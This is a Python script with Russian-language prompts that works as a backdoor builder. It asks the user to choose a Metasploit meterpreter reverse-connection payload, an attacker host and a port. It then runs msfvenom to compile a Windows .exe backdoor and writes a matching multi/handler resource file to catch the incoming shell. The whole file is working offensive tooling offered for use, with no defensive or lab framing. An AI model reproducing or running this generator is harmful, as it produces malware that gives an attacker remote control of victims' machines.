import os
import subprocess
import time

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'

os.system('clear')
print(color.BOLD+' Выбери тип соединения для бэкдора:'+color.END)
print(color.BOLD+' Для выхода CTRL + C'+color.END)
print(color.FAIL+'''
windows/meterpreter/reverse_tcp

windows/meterpreter/reverse_tcp_dns

windows/meterpreter/reverse_http

windows/meterpreter/reverse_https
'''+color.END)
windows=input(color.WARNING+'Какой тип соединения использовать будем? '+color.END)
time.sleep(0.5)
os.system('clear')
print(color.DARKCYAN+'Ваш ip'+color.END)
os.system('wget -qO- ipinfo.io/ip')
print(color.RED+color.BOLD+'Если вы на Wi-FI, то нужен локальный адрес, который вам дал WI-FI'+color.END)
lhost=input(color.FAIL+'LHOST: '+color.END)
print(color.DARKCYAN+'''
Через какой порт проводить соединения?
Не используйте 80 и 443 порт, они системные...
'''+color.END)
lport=input(color.FAIL+'LPORT: '+color.END)
time.sleep(0.8)
windowsfile=input(color.GREEN+'Filename exe: '+color.END)
time.sleep(0.5)
rc = open('windows/config/'+windowsfile+'.rc', 'w')
rc.write('''
use exploit/multi/handler
set PAYLOAD '''+windows+'''
set LHOST '''+lhost+'''
set LPORT '''+lport+'''
clear
exploit
''')
txt = open('windows/config/config.txt', 'a')
txt.write(' '+windowsfile+'.rc')
time.sleep(0.8)
print(color.WARNING+'Ожидайте, идёт компиляция файла...'+color.END)
os.system('msfvenom -p '+windows+' LHOST='+lhost+' LPORT='+lport+' -f exe -o windows/'+windowsfile+'.exe')
os.system('clear')
print(color.GREEN+'windows/'+windowsfile+'.exe'+color.END)
rc.close()
txt.close()
print(color.FAIL+'Выход...'+color.END)
